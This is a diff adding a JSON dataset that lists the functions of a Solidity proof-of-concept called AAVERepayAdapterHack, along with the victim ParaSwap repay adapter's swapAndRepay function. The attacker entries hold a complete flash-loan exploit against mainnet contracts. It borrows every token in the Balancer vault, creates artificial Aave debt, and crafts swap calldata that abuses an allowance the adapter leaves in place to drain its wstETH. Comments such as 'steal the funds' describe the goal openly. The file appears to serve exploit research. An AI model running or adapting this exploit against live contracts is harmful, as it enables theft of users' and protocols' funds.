@@ -1,0 +1,121 @@
+[
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        bytes calldata data\n    ) external {\n        // Log POOL\n        console.log(\"POOL: %s\", POOL); // 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2 Aave Ethereum USDC\n        // Underlying -> 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 (USDC)\n\n        // Allow Aave Pool V3 to spend the tokens\n        uint256 mustRepayWBTC = amounts[0] + premiums[0];\n        uint256 mustRepayLIDOWST = amounts[1] + premiums[1];\n        uint256 mustRepayUSDT = amounts[2] + premiums[2];\n\n        IERC20(WBTC).approve(POOL, mustRepayWBTC);\n        IERC20(LIDOWST).approve(POOL, mustRepayLIDOWST);\n        IUSDT(USDT).approve(POOL, mustRepayUSDT);\n\n        IAaveFlashloan pool = IAaveFlashloan(POOL);\n\n        // Supply x2 Balance of PARASWAP_REPAY_ADAPTER balance so we can call repayAndSwap after\n        uint256 balanceBeforeWBTC = IERC20(WBTC).balanceOf(PARASWAP_REPAY_ADAPTER);\n        uint256 balanceBeforeLIDOWST = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);\n        uint256 balanceBeforeUSDT = IERC20(USDT).balanceOf(PARASWAP_REPAY_ADAPTER);\n        // Log both\n        {\n            // Supply BTC to use as collateral\n            pool.supply(WBTC, mustRepayWBTC, address(this), 0);\n            ILendingPool(POOL).setUserUseReserveAsCollateral(WBTC, true);\n            IERC20(AAVE_WBTC_V3).approve(PARASWAP_REPAY_ADAPTER, mustRepayWBTC);\n\n            console.log(\"LIDOWST in PARASWAP_REPAY_ADAPTER at the moment: %s\", balanceBeforeLIDOWST);\n            uint256 someLIDOWSTsupplied = balanceBeforeLIDOWST * 2;\n            IERC20(LIDOWST).approve(POOL, someLIDOWSTsupplied);\n            pool.supply(LIDOWST, someLIDOWSTsupplied, address(this), 0);\n\n            // Log supplied\n            console.log(\"Supplied LIDOWST %s\", LIDOWST);\n\n            // Calc amount USDT to borrow\n            uint256 calcBorrowUSDT = _getBorrowAmount(balanceBeforeLIDOWST, USDT);\n            uint256 finalBorrowAmount = calcBorrowUSDT + (calcBorrowUSDT / 10);\n\n            // Log finaborrowAmount\n            console.log(\"finalBorrowAmount: %s\", finalBorrowAmount);\n            require(finalBorrowAmount == 1_776_451_780, \"wrong calculation\");\n\n            IERC20(AAVE_WSTETH_V3).approve(PARASWAP_REPAY_ADAPTER, mustRepayLIDOWST);\n\n            // We borrow to create an artifical debt inside AAVE, so we can use the PARASWAP_REPAY_ADAPTER to repay it\n            // We repay it partially on each `.withdraw()` call (2) through the hack\n            ILendingPool(POOL).borrow(USDT, finalBorrowAmount, 2, 0, address(this));\n\n            console.log(\"collateralAmount: %s\", balanceBeforeLIDOWST);\n            console.log(\"debtRepayAmount: %s\", calcBorrowUSDT);\n\n            bytes memory paraswapData;\n\n            {\n                address[] memory callees = new address[](1);\n                callees[0] = address(this);\n                bytes memory exchangeData = abi.encodeWithSignature(\"withdraw(address,uint256)\", USDT, calcBorrowUSDT);\n\n                // console.log(\"Exchange data:\");\n                // console.logBytes(exchangeData);\n                // console.logBytes(hex\"f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000060424684\");\n\n                uint256[] memory startIndexes = new uint256[](2);\n                startIndexes[0] = 0;\n                startIndexes[1] = 68;\n                uint256[] memory values = new uint256[](1);\n                values[0] = 0;\n                bytes memory buyCallData = abi.encodeWithSelector(\n                    hex\"54e3f31b\",\n                    (\n                        SimpleData( // simpleSwap 54e3f31b\n                            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // fromToken (WETH) (even if we will say to swapAndRepay() our collateral is gonna be LIDO)\n                            USDT, // toToken\n                            0, // fromAmount\n                            calcBorrowUSDT, // toAmount\n                            calcBorrowUSDT, // Expected amount\n                            callees,\n                            exchangeData,\n                            startIndexes,\n                            values,\n                            payable(PARASWAP_REPAY_ADAPTER), // beneficiary\n                            payable(address(this)), // partner\n                            0, // feePercent\n                            hex\"\", // permit\n                            1_724_819_351, // deadline\n                            bytes16(0)\n                        )\n                    )\n                );\n\n                paraswapData = abi.encode(buyCallData, AUGUSTUS_SWAPPER);\n            }\n            // console.log(\"Paraswap data:\");\n            // console.logBytes(paraswapData);\n\n            // Since AUGUSTUS_SWAPPER never cleans up the allowance of fromToken (LIDOWST), we do a first repay so\n            // tokenTransferProxy has extremely high allowance,\n            // our crafter buyCallData allow us to repay with our own funds from `.withdraw()` in our contract, not actually going through any swapping flow\n            IParaswapRepayAdapter(PARASWAP_REPAY_ADAPTER).swapAndRepay(\n                LIDOWST, // collateralAsset\n                USDT, // debtAsset\n                balanceBeforeLIDOWST,\n                calcBorrowUSDT,\n                2,\n                0,\n                paraswapData,\n                PermitSignature(0, 0, 0, 0, 0) // We already approved\n            );\n\n            // Time to abuse the extreme approval and steal the funds while repaying our USDT debt in the meantime\n\n            // Get our USDT debt\n            uint256 debtUSDT = IERC20(0x6df1C1E379bC5a00a7b4C6e67A203333772f45A8).balanceOf(address(this));\n            uint256 LidoWST_ToStealFromAdapter = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);\n\n            {\n                address[] memory callees = new address[](2);\n                callees[0] = LIDOWST;\n                callees[1] = address(this);\n                bytes memory exchangePart1 =\n                    abi.encodeWithSignature(\"transfer(address,uint256)\", address(this), LidoWST_ToStealFromAdapter); // Transfer LIDOWST to us\n                bytes memory exchangePart2 = abi.encodeWithSignature(\"withdraw(address,uint256)\", USDT, debtUSDT); // Repay our .borrow() debt\n                bytes memory exchangeData = abi.encodePacked(exchangePart1, exchangePart2);\n\n                // console.log(\"Exchange data:\");\n                // console.logBytes(exchangeData);\n                // console.log(\"0xa9059cbb00000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e00000000000000000000000000000000000000000000000005e9564c2c66c4f7f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000009a03a40\");\n\n                uint256[] memory startIndexes = new uint256[](3);\n                startIndexes[0] = 0;\n                startIndexes[1] = 68;\n                startIndexes[2] = 136;\n                uint256[] memory values = new uint256[](2);\n                values[0] = 0;\n                values[1] = 0;\n                bytes memory buyCallData = abi.encodeWithSelector(\n                    hex\"54e3f31b\",\n                    (\n                        SimpleData( // simpleSwap 54e3f31b\n                            LIDOWST, // fromToken\n                            USDT, // toToken\n                            LidoWST_ToStealFromAdapter, // fromAmount (all LIDOWST in PARASWAP_REPAY_ADAPTER)\n                            debtUSDT, // toAmount\n                            debtUSDT, // Expected amount\n                            callees,\n                            exchangeData,\n                            startIndexes,\n                            values,\n                            payable(PARASWAP_REPAY_ADAPTER), // beneficiary\n                            payable(address(this)), // partner\n                            0, // feePercent\n                            hex\"\", // permit\n                            1_724_819_351, // deadline\n                            bytes16(0)\n                        )\n                    )\n                );\n\n                paraswapData = abi.encode(buyCallData, AUGUSTUS_SWAPPER);\n            }\n            // console.log(\"Paraswap data:\");\n            // console.logBytes(paraswapData);\n\n            IParaswapRepayAdapter(PARASWAP_REPAY_ADAPTER).swapAndRepay(\n                WBTC, // collateralAsset\n                USDT, // debtAsset\n                1,\n                debtUSDT,\n                2,\n                0,\n                paraswapData,\n                PermitSignature(0, 0, 0, 0, 0) // We already approved\n            );\n\n            // Verify we stole the funds\n            console.log(\n                \"WSTETH in PARASWAP_REPAY_ADAPTER at the moment: %s\", IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER)\n            ); // 0\n\n            // Get back our supplied LIDOWST & WBTC (use type(uint).max to get all possible)\n            ILendingPool(POOL).withdraw(LIDOWST, type(uint256).max, address(this));\n            ILendingPool(POOL).withdraw(WBTC, type(uint256).max, address(this));\n            // console.log(\"Withdrew %s \", USDC);\n        }\n\n        repayFlashLoan(tokens, amounts, premiums);\n    }\n\n    // Calculation from here: https://app.dedaub.com/ethereum/address/0x78b0168a18ef61d7460fabb4795e5f1a9226583e/decompiled\n    // Basically  (PriceInUSDT + 30% + 1) + 10%\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "repayFlashLoan",
+    "original_code": "    function repayFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums\n    ) public {\n        for (uint256 i = 0; i < tokens.length; i++) {\n            IUSDT(tokens[i]).transfer(BALANCER_VAULT, amounts[i] + premiums[i]);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = LIDOWST;\n\n        (, bytes memory result2) = PARASWAP_REPAY_ADAPTER.staticcall(abi.encodeWithSignature(\"ORACLE()\"));\n        ORACLE = abi.decode(result2, (address));\n\n        (, bytes memory result) = PARASWAP_REPAY_ADAPTER.staticcall(abi.encodeWithSignature(\"POOL()\"));\n        POOL = abi.decode(result, (address));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        // NOTE: FOR BREVITY of the POC, WE'LL ONLY STEAL THE LIDO WST, but the same can be done for each token in the Adapter\n\n        uint256 balanceBeforeLIDOWST = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);\n        uint256 balanceBeforeUSDT = IERC20(USDT).balanceOf(PARASWAP_REPAY_ADAPTER);\n        uint256 balanceBeforeWBTC = IERC20(WBTC).balanceOf(PARASWAP_REPAY_ADAPTER);\n        // Log both\n        console.log(\"LIDOWST in PARASWAP_REPAY_ADAPTER balance before: %s\", balanceBeforeLIDOWST);\n        console.log(\"USDT in PARASWAP_REPAY_ADAPTER balance before: %s\", balanceBeforeUSDT);\n        console.log(\"WBTC in PARASWAP_REPAY_ADAPTER balance before: %s\", balanceBeforeWBTC);\n\n        uint256 balanceVaultWBTC = IERC20(WBTC).balanceOf(BALANCER_VAULT);\n        uint256 balanceVaultLIDOWST = IERC20(LIDOWST).balanceOf(BALANCER_VAULT);\n        uint256 balanceVaultUSDT = IERC20(USDT).balanceOf(BALANCER_VAULT);\n\n        // Log floashLoaned balances\n        console.log(\"Will flash: [WBTC] %s\", balanceVaultWBTC); // all vault\n        console.log(\"Will flash: [LIDOWST] %s\", balanceVaultLIDOWST); // all vault\n        console.log(\"Will flash: [USDT] %s\", balanceVaultUSDT); // all vault\n\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = balanceVaultWBTC;\n        amounts[1] = balanceVaultLIDOWST;\n        amounts[2] = balanceVaultUSDT;\n\n        address[] memory tokens = new address[](3);\n        tokens[0] = WBTC;\n        tokens[1] = LIDOWST;\n        tokens[2] = USDT;\n\n        // Flash loan Balancer max value of each token\n        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AAVERepayAdapterHack",
+    "source_type": "attacker_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(address user, uint256 withdrawAmount) public {\n        console.log(\"Withdraw %s\", withdrawAmount);\n        IUSDT(user).transfer(msg.sender, withdrawAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IParaswapRepayAdapter",
+    "source_type": "victim_contract",
+    "function_name": "swapAndRepay",
+    "original_code": "  function swapAndRepay(\n    IERC20Detailed collateralAsset,\n    IERC20Detailed debtAsset,\n    uint256 collateralAmount,\n    uint256 debtRepayAmount,\n    uint256 debtRateMode,\n    uint256 buyAllBalanceOffset,\n    bytes calldata paraswapData,\n    PermitSignature calldata permitSignature\n  ) external nonReentrant {\n    debtRepayAmount = getDebtRepayAmount(\n      debtAsset,\n      debtRateMode,\n      buyAllBalanceOffset,\n      debtRepayAmount,\n      msg.sender\n    );\n\n    // Pull aTokens from user\n    _pullATokenAndWithdraw(address(collateralAsset), msg.sender, collateralAmount, permitSignature);\n    //buy debt asset using collateral asset\n    uint256 amountSold = _buyOnParaSwap(\n      buyAllBalanceOffset,\n      paraswapData,\n      collateralAsset,\n      debtAsset,\n      collateralAmount,\n      debtRepayAmount\n    );\n\n    uint256 collateralBalanceLeft = collateralAmount - amountSold;\n\n    //deposit collateral back in the pool, if left after the swap(buy)\n    if (collateralBalanceLeft > 0) {\n      IERC20(collateralAsset).safeApprove(address(POOL), 0);\n      IERC20(collateralAsset).safeApprove(address(POOL), collateralBalanceLeft);\n      POOL.deposit(address(collateralAsset), collateralBalanceLeft, msg.sender, 0);\n    }\n\n    // Repay debt. Approves 0 first to comply with tokens that implement the anti frontrunning approval fix\n    IERC20(debtAsset).safeApprove(address(POOL), 0);\n    IERC20(debtAsset).safeApprove(address(POOL), debtRepayAmount);\n    POOL.repay(address(debtAsset), debtRepayAmount, debtRateMode, msg.sender);\n  }\n\n",
+    "description": ""
+  }
+]
